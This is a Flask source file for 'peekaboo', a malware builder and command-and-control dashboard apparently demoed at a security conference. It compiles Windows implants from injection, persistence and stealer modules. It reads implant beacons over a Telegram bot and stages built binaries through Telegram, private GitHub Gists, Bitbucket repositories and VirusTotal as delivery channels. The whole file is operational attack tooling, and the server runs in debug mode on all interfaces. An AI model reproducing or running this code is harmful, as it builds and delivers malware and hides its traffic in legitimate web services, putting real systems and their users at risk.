"""
peekaboo dashboard - C2 backend + AI chatbot
by @cocomelonc - DEFCON Demo Labs Singapore 2026
"""
from __future__ import annotations
import base64
import json
import os
import subprocess
import threading
import uuid
from datetime import datetime
from pathlib import Path

from flask import Flask, Response, jsonify, render_template, request, send_file, stream_with_context

try:
    import requests as _requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from chatbot import stream_chat, kb_info, has_knowledge_base, providers_status
    HAS_CHATBOT = True
except ImportError:
    HAS_CHATBOT = False
    def providers_status(): return {}

try:
    from mitre import (get_groups, get_group_techniques, get_all_techniques,
                       get_library, build_library_cache, available as mitre_available)
    HAS_MITRE = True
except ImportError:
    HAS_MITRE = False

try:
    import malpedia as _malpedia
    HAS_MALPEDIA = True
except ImportError:
    HAS_MALPEDIA = False

app = Flask(__name__)

BASE_DIR    = Path(__file__).parent.parent
CONFIG_DIR  = BASE_DIR / "config"
MALWARE_DIR = BASE_DIR / "malware"
PAYLOADS_DIR = BASE_DIR / "payloads"
LOG_FILE    = Path(__file__).parent / "builds.json"

# ── in-memory job store ────────────────────────────────────────────────────────
_builds: dict = {}
_lock = threading.Lock()


# ── helpers ────────────────────────────────────────────────────────────────────

def get_modules() -> dict:
    def _dirs(p: Path) -> list[str]:
        return sorted(d.name for d in p.iterdir() if d.is_dir()) if p.exists() else []
    def _stems(p: Path, ext: str = "*.c") -> list[str]:
        return sorted(f.stem for f in p.glob(ext)) if p.exists() else []
    return {
        "crypto":      _dirs(MALWARE_DIR / "crypto"),
        "injection":   _dirs(MALWARE_DIR / "injection"),
        "persistence": ["none"] + _stems(MALWARE_DIR / "persistence"),
        "stealer":     _stems(MALWARE_DIR / "stealer"),
        "payloads":    _stems(PAYLOADS_DIR),
    }


def _load_config(name: str) -> dict | None:
    path = CONFIG_DIR / f"{name}.json"
    if not path.exists():
        return None
    try:
        return json.loads(path.read_text())
    except Exception:
        return None


def _find_latest_binary() -> Path | None:
    """Find the most recently built peekaboo.exe anywhere under malware/."""
    candidates = list(MALWARE_DIR.rglob("peekaboo.exe"))
    if not candidates:
        return None
    return max(candidates, key=lambda p: p.stat().st_mtime)


def _save_build(build_id: str) -> None:
    logs: list = []
    if LOG_FILE.exists():
        try:
            logs = json.loads(LOG_FILE.read_text())
        except Exception:
            logs = []
    with _lock:
        entry = dict(_builds.get(build_id, {}))
    logs.append(entry)
    LOG_FILE.write_text(json.dumps(logs[-100:], indent=2))


def _run_build(build_id: str, params: dict) -> None:
    with _lock:
        _builds[build_id]["status"] = "running"
        _builds[build_id]["start_time"] = datetime.now().isoformat()

    cmd = [
        "python3", str(BASE_DIR / "peekaboo.py"),
        "-p", params.get("payload", "meow"),
        "-e", params.get("encryption", "speck"),
        "-m", params.get("malware", "injection"),
        "-i", params.get("injection", "virtualallocex"),
        "-s", params.get("stealer", "telegram"),
        "-r", params.get("persistence", "none"),
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True,
                                timeout=120, cwd=str(BASE_DIR))
        out = result.stdout + result.stderr
        status = "success" if result.returncode == 0 else "failed"
        rc = result.returncode
    except subprocess.TimeoutExpired:
        out, status, rc = "Build timed out after 120 seconds.", "timeout", -1
    except Exception as exc:
        out, status, rc = str(exc), "error", -1

    with _lock:
        _builds[build_id].update(output=out, returncode=rc, status=status,
                                  end_time=datetime.now().isoformat())
    _save_build(build_id)


# ── standard routes ────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html",
                           modules=get_modules(),
                           has_chatbot=HAS_CHATBOT,
                           kb=kb_info() if HAS_CHATBOT else {})


@app.route("/api/modules")
def api_modules():
    return jsonify(get_modules())


@app.route("/api/build", methods=["POST"])
def api_build():
    params = request.get_json(silent=True) or {}
    build_id = uuid.uuid4().hex[:8]
    with _lock:
        _builds[build_id] = {
            "id": build_id, "params": params, "status": "queued",
            "output": "", "returncode": None,
            "created": datetime.now().isoformat(),
            "start_time": None, "end_time": None,
        }
    threading.Thread(target=_run_build, args=(build_id, params), daemon=True).start()
    return jsonify({"build_id": build_id})


@app.route("/api/build/<build_id>")
def api_build_status(build_id: str):
    with _lock:
        job = dict(_builds.get(build_id, {}))
    if not job:
        return jsonify({"error": "not found"}), 404
    return jsonify(job)


@app.route("/api/build/<build_id>/files")
def api_build_files(build_id: str):
    with _lock:
        job = dict(_builds.get(build_id, {}))
    if not job:
        return jsonify({"error": "not found"}), 404
    if job.get("status") != "success":
        return jsonify({"files": []})
    params = job.get("params", {})
    malware_type = params.get("malware", "injection")
    persistence  = params.get("persistence", "none")

    if malware_type == "stealer":
        stealer = params.get("stealer", "telegram")
        out_dir = MALWARE_DIR / "stealer" / stealer
    else:
        out_dir = MALWARE_DIR / "injection" / params.get("injection", "virtualallocex")

    files = []
    peekaboo = out_dir / "peekaboo.exe"
    if peekaboo.exists():
        files.append({"name": "peekaboo.exe", "size": peekaboo.stat().st_size})
    if malware_type != "stealer" and persistence != "none":
        pers_exe = out_dir / "persistence.exe"
        if pers_exe.exists():
            files.append({"name": "persistence.exe", "size": pers_exe.stat().st_size,
                          "technique": persistence})
    return jsonify({"files": files, "build_id": build_id})


@app.route("/api/build/<build_id>/download/<filename>")
def api_build_download(build_id: str, filename: str):
    allowed = {"peekaboo.exe", "persistence.exe"}
    if filename not in allowed:
        return jsonify({"error": "not allowed"}), 400
    with _lock:
        job = dict(_builds.get(build_id, {}))
    if not job:
        return jsonify({"error": "not found"}), 404
    if job.get("status") != "success":
        return jsonify({"error": "build not successful"}), 400
    params = job.get("params", {})
    if params.get("malware") == "stealer":
        out_dir = MALWARE_DIR / "stealer" / params.get("stealer", "telegram")
    else:
        out_dir = MALWARE_DIR / "injection" / params.get("injection", "virtualallocex")
    file_path = out_dir / filename
    if not file_path.exists():
        return jsonify({"error": f"{filename} not found"}), 404
    return send_file(file_path, as_attachment=True, download_name=filename,
                     mimetype="application/octet-stream")


@app.route("/api/beacons")
def api_beacons():
    if not HAS_REQUESTS:
        return jsonify({"error": "requests not installed", "messages": []})
    cfg = _load_config("telegram_config")
    if not cfg:
        return jsonify({"error": "telegram_config.json not found", "messages": []})
    token = cfg.get("bot_token", "")
    if not token or "xxx" in token:
        return jsonify({"error": "telegram not configured", "messages": []})
    try:
        resp = _requests.get(f"https://api.telegram.org/bot{token}/getUpdates", timeout=6)
        data = resp.json()
        if not data.get("ok"):
            return jsonify({"error": "telegram API error", "messages": []})
        messages = []
        for update in data.get("result", [])[-30:]:
            msg = update.get("message", {})
            if msg:
                messages.append({
                    "update_id": update["update_id"],
                    "text":      msg.get("text", ""),
                    "date":      msg.get("date", 0),
                    "from":      msg.get("from", {}).get("username", "unknown"),
                    "chat_id":   msg.get("chat", {}).get("id", ""),
                })
        return jsonify({"messages": list(reversed(messages))})
    except Exception as exc:
        return jsonify({"error": str(exc), "messages": []})


@app.route("/api/logs")
def api_logs():
    if not LOG_FILE.exists():
        return jsonify([])
    try:
        return jsonify(json.loads(LOG_FILE.read_text()))
    except Exception:
        return jsonify([])


_SAFE_CONFIGS = {
    "telegram_config", "github_config", "bitbucket_config", "virustotal_config",
    "anthropic_config", "gemini_config", "malpedia_config",
    "azure_config", "angelcam_config", "ollama_config",
}
_SECRET_KEYS = {
    "bot_token", "github_token", "api_key", "api_token",
    "bitbucket_token_base64", "vt_api_key", "azure_pat",
}


@app.route("/api/config/<name>")
def api_config(name: str):
    if name not in _SAFE_CONFIGS:
        return jsonify({"error": "unknown config"}), 400
    cfg = _load_config(name)
    if cfg is None:
        return jsonify({"error": "not found"}), 404
    masked = dict(cfg)
    for key in _SECRET_KEYS:
        if key in masked and masked[key]:
            v = str(masked[key])
            masked[key] = v[:4] + "***" if len(v) > 4 else "***"
    return jsonify(masked)


@app.route("/api/config/<name>", methods=["POST"])
def api_config_save(name: str):
    if name not in _SAFE_CONFIGS:
        return jsonify({"error": "unknown config"}), 400
    data = request.get_json(silent=True) or {}
    cfg_path = CONFIG_DIR / f"{name}.json"
    existing = {}
    if cfg_path.exists():
        try:
            existing = json.loads(cfg_path.read_text())
        except Exception:
            pass
    # merge: keep existing secret values when the new value is masked (ends with ***)
    for k, v in data.items():
        if isinstance(v, str) and v.endswith("***"):
            data[k] = existing.get(k, "")
    existing.update(data)
    cfg_path.write_text(json.dumps(existing, indent=2))
    return jsonify({"ok": True})


# ── C2 binary delivery routes ──────────────────────────────────────────────────

@app.route("/api/c2/status")
def api_c2_status():
    """Check connectivity for each configured C2 channel."""
    if not HAS_REQUESTS:
        return jsonify({"error": "requests not installed"})

    results = {}

    # Telegram
    cfg = _load_config("telegram_config")
    if cfg and cfg.get("bot_token") and "xxx" not in cfg.get("bot_token", ""):
        try:
            r = _requests.get(
                f"https://api.telegram.org/bot{cfg['bot_token']}/getMe",
                timeout=5)
            d = r.json()
            results["telegram"] = {
                "ok": d.get("ok", False),
                "name": d.get("result", {}).get("username", ""),
            }
        except Exception as e:
            results["telegram"] = {"ok": False, "error": str(e)}
    else:
        results["telegram"] = {"ok": False, "error": "not configured"}

    # GitHub
    cfg = _load_config("github_config")
    if cfg and cfg.get("github_token") and "xxx" not in cfg.get("github_token", ""):
        try:
            r = _requests.get(
                "https://api.github.com/user",
                headers={"Authorization": f"Bearer {cfg['github_token']}"},
                timeout=5)
            results["github"] = {
                "ok": r.status_code == 200,
                "name": r.json().get("login", ""),
            }
        except Exception as e:
            results["github"] = {"ok": False, "error": str(e)}
    else:
        results["github"] = {"ok": False, "error": "not configured"}

    # Bitbucket
    cfg = _load_config("bitbucket_config")
    if cfg and cfg.get("bitbucket_token_base64"):
        try:
            token = base64.b64decode(cfg["bitbucket_token_base64"]).decode()
            r = _requests.get(
                "https://api.bitbucket.org/2.0/user",
                headers={"Authorization": f"Basic {cfg['bitbucket_token_base64']}"},
                timeout=5)
            results["bitbucket"] = {
                "ok": r.status_code == 200,
                "name": r.json().get("display_name", ""),
            }
        except Exception as e:
            results["bitbucket"] = {"ok": False, "error": str(e)}
    else:
        results["bitbucket"] = {"ok": False, "error": "not configured"}

    # VirusTotal
    cfg = _load_config("virustotal_config")
    if cfg and cfg.get("vt_api_key"):
        try:
            r = _requests.get(
                "https://www.virustotal.com/api/v3/users/current_user",
                headers={"x-apikey": cfg["vt_api_key"]},
                timeout=5)
            results["virustotal"] = {
                "ok": r.status_code == 200,
                "name": r.json().get("data", {}).get("id", ""),
            }
        except Exception as e:
            results["virustotal"] = {"ok": False, "error": str(e)}
    else:
        results["virustotal"] = {"ok": False, "error": "not configured"}

    return jsonify(results)


@app.route("/api/c2/deliver/telegram", methods=["POST"])
def c2_deliver_telegram():
    """
    Drop the latest built binary via Telegram sendDocument.
    Demonstrates: C2 binary delivery over Telegram bot API.
    MITRE ATT&CK: T1102 (Web Service), T1105 (Ingress Tool Transfer)
    """
    if not HAS_REQUESTS:
        return jsonify({"ok": False, "error": "requests not installed"}), 500

    cfg = _load_config("telegram_config")
    if not cfg:
        return jsonify({"ok": False, "error": "telegram_config.json not found"}), 400

    token   = cfg.get("bot_token", "")
    chat_id = cfg.get("chat_id", "")

    if not token or "xxx" in token:
        return jsonify({"ok": False, "error": "telegram not configured"}), 400

    binary = _find_latest_binary()
    if not binary:
        return jsonify({"ok": False, "error": "no built binary found - run the builder first"}), 400

    body = request.get_json(silent=True) or {}
    caption = body.get("caption",
        f"[peekaboo] payload drop\n"
        f"file: {binary.name}\n"
        f"size: {binary.stat().st_size} bytes\n"
        f"time: {datetime.utcnow().isoformat()}Z\n"
        f"[=^..^=] DEFCON Demo Labs 2026")

    try:
        with open(binary, "rb") as f:
            resp = _requests.post(
                f"https://api.telegram.org/bot{token}/sendDocument",
                data={"chat_id": chat_id, "caption": caption},
                files={"document": (binary.name, f, "application/octet-stream")},
                timeout=30,
            )
        data = resp.json()
        if data.get("ok"):
            msg = data["result"]
            return jsonify({
                "ok":        True,
                "channel":   "telegram",
                "file":      binary.name,
                "size":      binary.stat().st_size,
                "message_id": msg.get("message_id"),
                "chat_id":   chat_id,
                "url":       f"https://t.me/c/{str(chat_id).lstrip('-100')}/{msg.get('message_id')}",
                "technique": "T1102 + T1105",
            })
        else:
            return jsonify({"ok": False, "error": data.get("description", "unknown")}), 400
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/c2/deliver/github", methods=["POST"])
def c2_deliver_github():
    """
    Drop the latest built binary as a GitHub Gist (base64-encoded).
    Simulates: C2 staging via GitHub Gists - implant polls for new gists.
    MITRE ATT&CK: T1102.001 (Dead Drop Resolver), T1105
    """
    if not HAS_REQUESTS:
        return jsonify({"ok": False, "error": "requests not installed"}), 500

    cfg = _load_config("github_config")
    if not cfg:
        return jsonify({"ok": False, "error": "github_config.json not found"}), 400

    token = cfg.get("github_token", "")
    if not token or "xxx" in token:
        return jsonify({"ok": False, "error": "github not configured"}), 400

    binary = _find_latest_binary()
    if not binary:
        return jsonify({"ok": False, "error": "no built binary found - run the builder first"}), 400

    body = request.get_json(silent=True) or {}
    description = body.get("description",
        f"peekaboo payload drop - DEFCON Demo Labs 2026 - {datetime.utcnow().isoformat()}Z")

    try:
        encoded = base64.b64encode(binary.read_bytes()).decode()
        # chunk into 60-char lines for readability
        encoded_chunked = "\n".join(encoded[i:i+60] for i in range(0, len(encoded), 60))

        payload = {
            "description": description,
            "public": False,
            "files": {
                f"{binary.stem}_b64.txt": {
                    "content": f"# peekaboo payload - base64 encoded\n# decode: base64 -d <file> > payload.exe\n\n{encoded_chunked}\n"
                },
                "README.md": {
                    "content": (
                        f"# peekaboo drop\n\n"
                        f"**file:** `{binary.name}`  \n"
                        f"**size:** `{binary.stat().st_size}` bytes  \n"
                        f"**time:** `{datetime.utcnow().isoformat()}Z`  \n\n"
                        f"## decode\n```bash\nbase64 -d {binary.stem}_b64.txt > {binary.name}\n```\n\n"
                        f"*DEFCON Demo Labs Singapore 2026 - by @cocomelonc*\n"
                    )
                }
            }
        }

        resp = _requests.post(
            "https://api.github.com/gists",
            headers={"Authorization": f"Bearer {token}",
                     "Accept": "application/vnd.github+json"},
            json=payload,
            timeout=15,
        )

        if resp.status_code == 201:
            data = resp.json()
            return jsonify({
                "ok":       True,
                "channel":  "github",
                "file":     binary.name,
                "size":     binary.stat().st_size,
                "gist_id":  data["id"],
                "url":      data["html_url"],
                "raw_url":  data["files"][f"{binary.stem}_b64.txt"]["raw_url"],
                "technique": "T1102.001 + T1105",
            })
        else:
            return jsonify({"ok": False, "error": resp.json().get("message", resp.text)}), 400

    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/c2/deliver/virustotal", methods=["POST"])
def c2_deliver_virustotal():
    """
    Upload the latest built binary to VirusTotal.
    Demonstrates: VirusTotal abuse as C2/exfil channel + AV detection scoring.
    MITRE ATT&CK: T1102 (Web Service)
    """
    if not HAS_REQUESTS:
        return jsonify({"ok": False, "error": "requests not installed"}), 500

    cfg = _load_config("virustotal_config")
    if not cfg:
        return jsonify({"ok": False, "error": "virustotal_config.json not found"}), 400

    api_key = cfg.get("vt_api_key", "")
    if not api_key:
        return jsonify({"ok": False, "error": "virustotal not configured"}), 400

    binary = _find_latest_binary()
    if not binary:
        return jsonify({"ok": False, "error": "no built binary found - run the builder first"}), 400

    try:
        with open(binary, "rb") as f:
            resp = _requests.post(
                "https://www.virustotal.com/api/v3/files",
                headers={"x-apikey": api_key},
                files={"file": (binary.name, f, "application/octet-stream")},
                timeout=60,
            )

        if resp.status_code in (200, 201):
            data = resp.json()
            analysis_id = data.get("data", {}).get("id", "")
            return jsonify({
                "ok":          True,
                "channel":     "virustotal",
                "file":        binary.name,
                "size":        binary.stat().st_size,
                "analysis_id": analysis_id,
                "url":         f"https://www.virustotal.com/gui/file-analysis/{analysis_id}",
                "technique":   "T1102",
                "note":        "Analysis pending - check VirusTotal for detection results",
            })
        else:
            return jsonify({"ok": False,
                            "error": resp.json().get("error", {}).get("message", resp.text)}), 400
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/c2/deliver/bitbucket", methods=["POST"])
def c2_deliver_bitbucket():
    """
    Push the latest built binary to Bitbucket repo as base64-encoded file.
    Demonstrates: Bitbucket as C2 staging channel.
    MITRE ATT&CK: T1102 (Web Service), T1105
    """
    if not HAS_REQUESTS:
        return jsonify({"ok": False, "error": "requests not installed"}), 500

    cfg = _load_config("bitbucket_config")
    if not cfg:
        return jsonify({"ok": False, "error": "bitbucket_config.json not found"}), 400

    token_b64 = cfg.get("bitbucket_token_base64", "")
    workspace = cfg.get("bitbucket_workspace", "")
    repo      = cfg.get("bitbucket_repo", "")

    if not all([token_b64, workspace, repo]):
        return jsonify({"ok": False, "error": "bitbucket not fully configured"}), 400

    binary = _find_latest_binary()
    if not binary:
        return jsonify({"ok": False, "error": "no built binary found - run the builder first"}), 400

    try:
        encoded = base64.b64encode(binary.read_bytes()).decode()
        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        filename = f"drops/{ts}_{binary.stem}_b64.txt"

        content = (
            f"# peekaboo payload drop\n"
            f"# time: {datetime.utcnow().isoformat()}Z\n"
            f"# file: {binary.name} ({binary.stat().st_size} bytes)\n"
            f"# decode: base64 -d <this_file> > {binary.name}\n\n"
            f"{encoded}\n"
        )

        resp = _requests.post(
            f"https://api.bitbucket.org/2.0/repositories/{workspace}/{repo}/src",
            headers={"Authorization": f"Basic {token_b64}"},
            data={
                filename: content,
                "message": f"[peekaboo] payload drop {ts} - DEFCON Demo 2026",
                "branch": "main",
            },
            timeout=20,
        )

        if resp.status_code in (200, 201):
            file_url = f"https://bitbucket.org/{workspace}/{repo}/src/main/{filename}"
            return jsonify({
                "ok":       True,
                "channel":  "bitbucket",
                "file":     binary.name,
                "size":     binary.stat().st_size,
                "path":     filename,
                "url":      file_url,
                "technique": "T1102 + T1105",
            })
        else:
            return jsonify({"ok": False, "error": resp.text[:300]}), 400
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/c2/binary_info")
def api_binary_info():
    """Return info about the latest built binary."""
    binary = _find_latest_binary()
    if not binary:
        return jsonify({"found": False})
    st = binary.stat()
    return jsonify({
        "found":    True,
        "path":     str(binary.relative_to(BASE_DIR)),
        "name":     binary.name,
        "size":     st.st_size,
        "modified": datetime.fromtimestamp(st.st_mtime).isoformat(),
    })


# ── chatbot routes ─────────────────────────────────────────────────────────────

@app.route("/api/chat", methods=["POST"])
def api_chat():
    """
    SSE streaming chat endpoint.
    Body: {"messages": [{role, content}, ...]}
    """
    if not HAS_CHATBOT:
        return jsonify({"error": "chatbot module not available"}), 503

    data = request.get_json(silent=True) or {}
    messages  = data.get("messages", [])
    provider  = data.get("provider", "claude")  # "claude" | "gemini"
    if not messages:
        return jsonify({"error": "no messages provided"}), 400

    def generate():
        try:
            for chunk in stream_chat(messages, provider=provider):
                if isinstance(chunk, dict):
                    yield f"data: {json.dumps(chunk)}\n\n"
                else:
                    yield f"data: {json.dumps({'text': chunk})}\n\n"
        except Exception as e:
            yield f"data: {json.dumps({'error': str(e)})}\n\n"
        finally:
            yield "data: [DONE]\n\n"

    return Response(
        stream_with_context(generate()),
        content_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
        }
    )


@app.route("/api/chat/kb_info")
def api_kb_info():
    if not HAS_CHATBOT:
        return jsonify({"status": "chatbot_unavailable"})
    return jsonify(kb_info())


@app.route("/api/chat/providers")
def api_providers():
    return jsonify(providers_status())


@app.route("/api/chat/scrape", methods=["POST"])
def api_scrape():
    """Trigger blog scraper in background."""
    def _scrape():
        try:
            from scraper import scrape
            scrape()
        except Exception as e:
            print(f"[scraper error] {e}")

    t = threading.Thread(target=_scrape, daemon=True)
    t.start()
    return jsonify({"ok": True, "message": "indexer started - check /api/chat/kb_info for status"})


# ── MITRE ATT&CK routes ───────────────────────────────────────────────────────

@app.route("/api/mitre/available")
def api_mitre_available():
    return jsonify({"available": HAS_MITRE and mitre_available() if HAS_MITRE else False})


@app.route("/api/mitre/groups")
def api_mitre_groups():
    if not HAS_MITRE:
        return jsonify({"error": "mitre module not available"}), 503
    if not mitre_available():
        return jsonify({"error": "STIX bundle not found"}), 503
    return jsonify(get_groups())


@app.route("/api/mitre/techniques")
def api_mitre_all_techniques():
    if not HAS_MITRE:
        return jsonify({"error": "mitre module not available"}), 503
    return jsonify(get_all_techniques())


@app.route("/api/mitre/library")
def api_mitre_library():
    if not HAS_MITRE:
        return jsonify({"error": "mitre module not available"}), 503
    category = request.args.get("category", "all")
    return jsonify(get_library(category))


@app.route("/api/mitre/library/rebuild", methods=["POST"])
def api_mitre_library_rebuild():
    if not HAS_MITRE:
        return jsonify({"error": "mitre module not available"}), 503
    def _rebuild():
        build_library_cache()
    threading.Thread(target=_rebuild, daemon=True).start()
    return jsonify({"ok": True, "message": "rebuilding library cache in background"})


@app.route("/api/mitre/library/categories")
def api_mitre_library_cats():
    if not HAS_MITRE:
        return jsonify([])
    entries = get_library()
    cats: dict[str, int] = {}
    for e in entries:
        cats[e["category"]] = cats.get(e["category"], 0) + 1
    return jsonify(sorted(cats.items(), key=lambda x: -x[1]))


@app.route("/api/mitre/group/<stix_id>/techniques")
def api_mitre_techniques(stix_id: str):
    if not HAS_MITRE:
        return jsonify({"error": "mitre module not available"}), 503
    category = request.args.get("category", "all")
    return jsonify(get_group_techniques(stix_id, category))


# ── Malpedia routes ────────────────────────────────────────────────────────────

@app.route("/api/malpedia/status")
def api_malpedia_status():
    if not HAS_MALPEDIA:
        return jsonify({"ok": False, "error": "malpedia module not available"}), 503
    return jsonify(_malpedia.get_status())


@app.route("/api/malpedia/actors")
def api_malpedia_actors():
    if not HAS_MALPEDIA:
        return jsonify([]), 503
    refresh = request.args.get("refresh") == "1"
    return jsonify(_malpedia.list_actors(force_refresh=refresh))


@app.route("/api/malpedia/actor/<actor_id>")
def api_malpedia_actor(actor_id: str):
    if not HAS_MALPEDIA:
        return jsonify({"error": "unavailable"}), 503
    return jsonify(_malpedia.get_actor(actor_id))


@app.route("/api/malpedia/families")
def api_malpedia_families():
    if not HAS_MALPEDIA:
        return jsonify([]), 503
    refresh = request.args.get("refresh") == "1"
    return jsonify(_malpedia.list_families(force_refresh=refresh))


@app.route("/api/malpedia/family/<path:family_id>")
def api_malpedia_family(family_id: str):
    if not HAS_MALPEDIA:
        return jsonify({"error": "unavailable"}), 503
    return jsonify(_malpedia.get_family(family_id))


@app.route("/api/malpedia/search")
def api_malpedia_search():
    if not HAS_MALPEDIA:
        return jsonify({"actors": [], "families": []}), 503
    q    = request.args.get("q", "").strip()
    kind = request.args.get("type", "all")
    if not q:
        return jsonify({"actors": [], "families": []})
    actors   = _malpedia.find_actor(q)   if kind in ("all", "actor")  else []
    families = _malpedia.find_family(q)  if kind in ("all", "family") else []
    return jsonify({"actors": actors[:50], "families": families[:50]})


@app.route("/api/semantic/status")
def api_semantic_status():
    try:
        from semantic import available, _EMB_CACHE
        emb_count = 0
        if _EMB_CACHE.exists():
            import json as _json
            emb_count = len(_json.loads(_EMB_CACHE.read_text()))
        return jsonify({"available": available(), "embedded_posts": emb_count})
    except Exception as e:
        return jsonify({"available": False, "error": str(e)})


@app.route("/api/semantic/rebuild", methods=["POST"])
def api_semantic_rebuild():
    try:
        from semantic import build_post_embeddings
        ok = build_post_embeddings(force=True)
        return jsonify({"ok": ok})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
